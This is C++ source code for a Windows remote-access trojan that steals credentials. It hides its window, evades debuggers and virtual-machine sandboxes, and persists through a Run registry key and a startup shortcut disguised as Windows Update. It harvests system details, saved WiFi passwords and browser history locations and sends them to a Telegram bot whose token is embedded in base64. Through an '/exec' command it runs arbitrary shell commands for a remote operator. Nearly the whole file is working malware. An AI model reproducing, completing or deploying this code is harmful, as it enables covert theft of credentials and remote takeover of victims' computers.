#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <thread>
#include <fstream>
#include <sstream>
#include <iostream>
#include <filesystem>
#include <random>
#include <regex>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;

// Simple XOR encryption for strings
class StringObfuscator {
private:
    static constexpr char KEY = 0x5A;
public:
    static std::string obfuscate(const std::string& str) {
        std::string result = str;
        for (char& c : result) c ^= KEY;
        return result;
    }
    
    static std::string deobfuscate(const std::string& str) {
        std::string result = str;
        for (char& c : result) c ^= KEY;
        return result;
    }
};

#define OBF(str) StringObfuscator::deobfuscate(std::string(str, sizeof(str)-1))

// Base64 decoding for embedded data
class Base64 {
public:
    static std::string decode(const std::string& input) {
        std::string decoded;
        DWORD size = 0;
        
        CryptStringToBinaryA(input.c_str(), input.length(), 
            CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
        
        std::vector<BYTE> buffer(size);
        CryptStringToBinaryA(input.c_str(), input.length(),
            CRYPT_STRING_BASE64, buffer.data(), &size, nullptr, nullptr);
        
        return std::string(buffer.begin(), buffer.end());
    }
};

// System Information Collection
class SystemInfo {
public:
    static std::string getAllInfo() {
        std::stringstream ss;
        
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        
        char username[256];
        size = sizeof(username);
        GetUserNameA(username, &size);
        
        ss << "Hostname: " << hostname << "\n";
        ss << "Username: " << username << "\n";
        
        // Get IP
        struct hostent* host = gethostbyname(hostname);
        if (host && host->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, host->h_addr_list[0], host->h_length);
            ss << "IP: " << inet_ntoa(addr) << "\n";
        }
        
        // Get MAC
        IP_ADAPTER_INFO adapter_info[16];
        DWORD buf_size = sizeof(adapter_info);
        if (GetAdaptersInfo(adapter_info, &buf_size) == NO_ERROR) {
            PIP_ADAPTER_INFO adapter = adapter_info;
            if (adapter && adapter->AddressLength >= 6) {
                char mac[18];
                sprintf_s(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                    adapter->Address[0], adapter->Address[1], adapter->Address[2],
                    adapter->Address[3], adapter->Address[4], adapter->Address[5]);
                ss << "MAC: " << mac << "\n";
            }
        }
        
        return ss.str();
    }
};

// WiFi Password Extraction
class WiFiExtractor {
public:
    static std::string extractAll() {
        std::stringstream result;
        result << "WiFi Networks:\n\n";
        
        FILE* pipe = _popen("netsh wlan show profiles", "r");
        if (!pipe) return "Failed to get WiFi profiles";
        
        char buffer[1024];
        std::string output;
        while (fgets(buffer, sizeof(buffer), pipe)) output += buffer;
        _pclose(pipe);
        
        std::regex profile_regex("All User Profile\\s+:\\s+(.+)");
        std::smatch match;
        std::string::const_iterator search_start(output.cbegin());
        
        while (std::regex_search(search_start, output.cend(), match, profile_regex)) {
            std::string ssid = match[1].str();
            std::string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
            
            pipe = _popen(cmd.c_str(), "r");
            std::string profile_output;
            while (fgets(buffer, sizeof(buffer), pipe)) profile_output += buffer;
            _pclose(pipe);
            
            std::regex pass_regex("Key Content\\s+:\\s+(.+)");
            std::smatch pass_match;
            if (std::regex_search(profile_output, pass_match, pass_regex)) {
                result << ssid << ": " << pass_match[1].str() << "\n";
            }
            search_start = match[0].second;
        }
        
        return result.str();
    }
};

// Browser History Extraction (simplified - just locating files)
class HistoryExtractor {
public:
    static std::string extract() {
        std::stringstream result;
        result << "Browser History Files:\n\n";
        
        // Chrome
        std::string localAppData = getenv("LOCALAPPDATA");
        if (!localAppData.empty()) {
            std::string chrome = localAppData + "\\Google\\Chrome\\User Data\\Default\\History";
            if (fs::exists(chrome)) result << "Chrome: " << chrome << "\n";
            
            std::string edge = localAppData + "\\Microsoft\\Edge\\User Data\\Default\\History";
            if (fs::exists(edge)) result << "Edge: " << edge << "\n";
        }
        
        // Firefox
        std::string appdata = getenv("APPDATA");
        if (!appdata.empty()) {
            std::string profiles = appdata + "\\Mozilla\\Firefox\\Profiles";
            if (fs::exists(profiles)) {
                for (const auto& entry : fs::directory_iterator(profiles)) {
                    if (entry.is_directory()) {
                        std::string places = entry.path().string() + "\\places.sqlite";
                        if (fs::exists(places)) {
                            result << "Firefox: " << places << "\n";
                            break;
                        }
                    }
                }
            }
        }
        
        return result.str();
    }
};

// Telegram Communication
class TelegramBot {
private:
    std::string token;
    std::string chat_id;
    
    std::string http_get(const std::string& url) {
        std::string result;
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", 
            INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        if (hConnect) {
            std::string path = "/bot" + token + "/" + url;
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path.c_str(), 
                "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE, 0);
            
            if (hRequest) {
                if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                    char buffer[4096];
                    DWORD bytes_read;
                    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
                        result.append(buffer, bytes_read);
                    }
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
        return result;
    }
    
    std::string http_post(const std::string& url, const std::string& data) {
        std::string result;
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", 
            INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        if (hConnect) {
            std::string path = "/bot" + token + "/" + url;
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), 
                "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE, 0);
            
            if (hRequest) {
                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                    (LPVOID)data.c_str(), data.length())) {
                    char buffer[4096];
                    DWORD bytes_read;
                    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
                        result.append(buffer, bytes_read);
                    }
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
        return result;
    }
    
public:
    TelegramBot(const std::string& t, const std::string& c) : token(t), chat_id(c) {}
    
    bool sendMessage(const std::string& message) {
        std::string data = "chat_id=" + chat_id + "&text=" + urlEncode(message);
        std::string response = http_post("sendMessage", data);
        return response.find("\"ok\":true") != std::string::npos;
    }
    
    std::string getUpdates() {
        return http_get("getUpdates?timeout=5");
    }
    
private:
    std::string urlEncode(const std::string& str) {
        std::string encoded;
        char hex[] = "0123456789ABCDEF";
        for (unsigned char c : str) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                encoded += c;
            } else {
                encoded += '%';
                encoded += hex[c >> 4];
                encoded += hex[c & 0xF];
            }
        }
        return encoded;
    }
};

// Persistence (User-level only)
class Persistence {
private:
    std::string getExePath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }
    
public:
    void install() {
        std::string exe_path = getExePath();
        
        // Registry Run (HKCU only - no admin needed)
        HKEY hKey;
        std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdateSvc", 0, REG_SZ, 
                (const BYTE*)exe_path.c_str(), exe_path.length() + 1);
            RegCloseKey(hKey);
        }
        
        // Startup Folder
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            std::string shortcut = std::string(startup_path) + "\\WindowsUpdate.lnk";
            
            // Create shortcut using simple file copy
            std::ofstream shortcut_file(shortcut, std::ios::binary);
            if (shortcut_file.is_open()) {
                shortcut_file << "[InternetShortcut]\n";
                shortcut_file << "URL=file:///" << exe_path << "\n";
                shortcut_file << "IconIndex=0\n";
                shortcut_file << "IconFile=" << exe_path << "\n";
                shortcut_file.close();
            }
        }
    }
    
    void remove() {
        // Remove from Registry
        std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        RegDeleteKeyValueA(HKEY_CURRENT_USER, regPath.c_str(), "WindowsUpdateSvc");
        
        // Remove from Startup
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            std::string shortcut = std::string(startup_path) + "\\WindowsUpdate.lnk";
            DeleteFileA(shortcut.c_str());
        }
    }
};

// Anti-Analysis
class AntiAnalysis {
public:
    static bool isDebugger() {
        return IsDebuggerPresent();
    }
    
    static bool isSandbox() {
        // Check for common sandbox processes
        const char* sandbox_processes[] = {
            "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", 
            "vmwaretray.exe", "xenservice.exe", "qemu-ga.exe"
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {0};
            pe.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe)) {
                do {
                    std::string name = pe.szExeFile;
                    for (const auto& sp : sandbox_processes) {
                        if (name.find(sp) != std::string::npos) {
                            CloseHandle(snapshot);
                            return true;
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        
        // Check MAC addresses for virtualization
        IP_ADAPTER_INFO adapter_info[16];
        DWORD size = sizeof(adapter_info);
        if (GetAdaptersInfo(adapter_info, &size) == NO_ERROR) {
            PIP_ADAPTER_INFO adapter = adapter_info;
            while (adapter) {
                if (adapter->AddressLength >= 3) {
                    if ((adapter->Address[0] == 0x00 && adapter->Address[1] == 0x50 && adapter->Address[2] == 0x56) ||
                        (adapter->Address[0] == 0x00 && adapter->Address[1] == 0x0C && adapter->Address[2] == 0x29)) {
                        return true;
                    }
                }
                adapter = adapter->Next;
            }
        }
        
        return false;
    }
};

// Main payload
class Payload {
private:
    TelegramBot bot;
    Persistence persistence;
    bool running;
    std::thread listener_thread;
    
    void sendInitialData() {
        bot.sendMessage("[+] System Connected");
        bot.sendMessage(SystemInfo::getAllInfo());
        
        std::string wifi = WiFiExtractor::extractAll();
        if (wifi.length() > 10) bot.sendMessage(wifi);
        
        std::string history = HistoryExtractor::extract();
        if (history.length() > 10) bot.sendMessage(history);
    }
    
    void commandListener() {
        int last_update_id = 0;
        
        while (running) {
            Sleep(3000);
            
            std::string response = bot.getUpdates();
            
            size_t update_pos = response.find("\"update_id\":");
            while (update_pos != std::string::npos) {
                size_t id_start = update_pos + 11;
                size_t id_end = response.find(',', id_start);
                int update_id = std::stoi(response.substr(id_start, id_end - id_start));
                
                if (update_id > last_update_id) {
                    last_update_id = update_id;
                    
                    size_t text_pos = response.find("\"text\":\"", id_end);
                    if (text_pos != std::string::npos) {
                        text_pos += 8;
                        size_t text_end = response.find('\"', text_pos);
                        std::string cmd = response.substr(text_pos, text_end - text_pos);
                        executeCommand(cmd);
                    }
                }
                
                update_pos = response.find("\"update_id\":", update_pos + 1);
            }
        }
    }
    
    void executeCommand(const std::string& cmd) {
        if (cmd == "/exit") {
            bot.sendMessage("[+] Exiting...");
            running = false;
            ExitProcess(0);
        }
        else if (cmd == "/persist") {
            persistence.install();
            bot.sendMessage("[+] Persistence installed");
        }
        else if (cmd == "/remove") {
            persistence.remove();
            bot.sendMessage("[+] Persistence removed");
        }
        else if (cmd.find("/exec ") == 0) {
            std::string command = cmd.substr(6);
            
            FILE* pipe = _popen(command.c_str(), "r");
            if (pipe) {
                char buffer[4096];
                std::string result;
                while (fgets(buffer, sizeof(buffer), pipe)) {
                    result += buffer;
                }
                _pclose(pipe);
                
                if (result.empty()) result = "[+] Command executed (no output)";
                if (result.length() > 4000) result = result.substr(0, 4000) + "\n[truncated]";
                bot.sendMessage(result);
            }
        }
        else {
            bot.sendMessage("[+] Command received: " + cmd);
        }
    }
    
public:
    Payload(const std::string& token, const std::string& chat) 
        : bot(token, chat), running(false) {}
    
    void start() {
        running = true;
        
        // Install persistence immediately
        persistence.install();
        
        // Send initial data
        sendInitialData();
        
        // Start command listener
        listener_thread = std::thread(&Payload::commandListener, this);
    }
    
    void stop() {
        running = false;
        if (listener_thread.joinable()) {
            listener_thread.join();
        }
    }
};

// Self-deletion
void selfDelete() {
    char module_path[MAX_PATH];
    GetModuleFileNameA(NULL, module_path, MAX_PATH);
    
    std::string tempPath = getenv("TEMP");
    if (tempPath.empty()) tempPath = "C:\\Windows\\Temp";
    
    std::string batch = tempPath + "\\cleanup.bat";
    std::ofstream batch_file(batch);
    batch_file << "@echo off\n";
    batch_file << "timeout /t 2 /nobreak >nul\n";
    batch_file << "del \"" << module_path << "\"\n";
    batch_file << "del \"" << batch << "\"\n";
    batch_file.close();
    
    ShellExecuteA(NULL, "open", batch.c_str(), NULL, NULL, SW_HIDE);
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    // Random seed
    srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId()));
    
    // Anti-analysis checks
    if (AntiAnalysis::isDebugger() || AntiAnalysis::isSandbox()) {
        MessageBoxA(NULL, "Application failed to initialize.", "Error", MB_OK | MB_ICONERROR);
        selfDelete();
        return 0;
    }
    
    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    // Your Telegram bot token and chat ID (base64 encoded to avoid static strings)
    std::string token = Base64::decode("ODU5MDI1ODIwNjpBQUh3bVpMNnA3YUVvR0dQejAzVk5fMl9LNnFGYnFLTGUyUQ==");
    std::string chat_id = "7369364451";
    
    // Start payload
    Payload payload(token, chat_id);
    payload.start();
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    WSACleanup();
    return 0;
}
